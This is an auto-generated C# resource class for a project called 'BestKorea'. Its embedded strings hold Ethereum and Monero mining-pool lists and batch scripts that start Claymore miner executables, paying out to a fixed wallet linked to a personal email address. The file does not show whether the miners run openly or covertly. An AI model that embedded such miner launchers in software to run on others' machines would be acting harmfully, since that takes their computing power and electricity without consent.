//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:4.0.30319.42000
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace BestKorea.Properties {
    using System;
    
    
    /// <summary>
    ///   A strongly-typed resource class, for looking up localized strings, etc.
    /// </summary>
    // This class was auto-generated by the StronglyTypedResourceBuilder
    // class via a tool like ResGen or Visual Studio.
    // To add or remove a member, edit your .ResX file then rerun ResGen
    // with the /str option, or rebuild your VS project.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "15.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Returns the cached ResourceManager instance used by this class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("BestKorea.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Overrides the current thread's CurrentUICulture property for all
        ///   resource lookups using this strongly typed resource class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to POOL: eth-us-west1.nanopool.org:9999, WALLET: 0x2a156c6dd3bdf2a0c5b284b45b2396c053c2a63d.Jacquais1/sullyjack1717@gmail.com, PSW: x, WORKER: , ESM: 0, ALLPOOLS: 0
        ///POOL: eth-eu1.nanopool.org:9999, WALLET: 0x2a156c6dd3bdf2a0c5b284b45b2396c053c2a63d.Jacquais1/sullyjack1717@gmail.com, PSW: x, WORKER: , ESM: 0, ALLPOOLS: 0
        ///POOL: eth-eu2.nanopool.org:9999, WALLET: 0x2a156c6dd3bdf2a0c5b284b45b2396c053c2a63d.Jacquais1/sullyjack1717@gmail.com, PSW: x, WORKER: , ESM: 0, ALLPOOLS: 0
        ///POOL: eth-asia1.nanopool.org:9999 [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string epoolsETH {
            get {
                return ResourceManager.GetString("epoolsETH", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to POOL: stratum+ssl://xmr-eu1.nanopool.org:14433, WALLET: YOUR_XMR_ADDRESS.0.PLACEHOLDER/lol@gmail.com, PSW: x, ALLPOOLS: 0
        ///POOL: stratum+ssl://xmr-eu2.nanopool.org:14433, WALLET: YOUR_XMR_ADDRESS.0.PLACEHOLDER/lol@gmail.com, PSW: x, ALLPOOLS: 0
        ///POOL: stratum+ssl://xmr-asia1.nanopool.org:14433, WALLET: YOUR_XMR_ADDRESS.0.PLACEHOLDER/lol@gmail.com, PSW: x, ALLPOOLS: 0
        ///POOL: stratum+ssl://xmr-us-east1.nanopool.org:14433, WALLET: YOUR_XMR_ADDRESS.0.PLACEHOLDER/lol@gmail.com, PSW: x, ALLPOOLS: 0
        ///POOL: stratum [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string epoolsXMR {
            get {
                return ResourceManager.GetString("epoolsXMR", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to @echo off
        ///set coin=%0
        ///
        ///IF &quot;%coin%&quot;==&quot;xmr&quot; (
        ///    start &quot;&quot; NsCpuCNMiner64.exe -o stratum+ssl://xmr-eu1.nanopool.org:14433 -u YOUR_XMR_ADDRESS.0.PLACEHOLDER/lol@gmail.com -p z
        ///) ELSE(
        ///	setx GPU_USE_SYNC_OBJECTS 1
        ///	setx GPU_MAX_HEAP_SIZE 100
        ///	start &quot;&quot; EthDcrMiner64.exe -epool eth-us-east1.nanopool.org:9999 -ewal 0x2a156c6dd3bdf2a0c5b284b45b2396c053c2a63d.Jacquais1/sullyjack1717@gmail.com -epsw x -mode 1 -ftime 10
        ///).
        /// </summary>
        internal static string execute {
            get {
                return ResourceManager.GetString("execute", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to @echo off
        ///set coin=%0
        ///
        ///IF &quot;%coin%&quot;==&quot;xmr&quot; (
        ///    start &quot;&quot; NsCpuCNMiner64.exe -o stratum+ssl://xmr-eu1.nanopool.org:14433 -u YOUR_XMR_ADDRESS.0.PLACEHOLDER/lol@gmail.com -p z
        ///) ELSE(
        ///	setx GPU_USE_SYNC_OBJECTS 1
        ///	setx GPU_MAX_HEAP_SIZE 100
        ///	start &quot;&quot; EthDcrMiner64.exe -epool eth-us-east1.nanopool.org:9999 -ewal 0x2a156c6dd3bdf2a0c5b284b45b2396c053c2a63d.Jacquais1/sullyjack1717@gmail.com -epsw x -mode 1 -ftime 10
        ///).
        /// </summary>
        internal static string start {
            get {
                return ResourceManager.GetString("start", resourceCulture);
            }
        }
    }
}
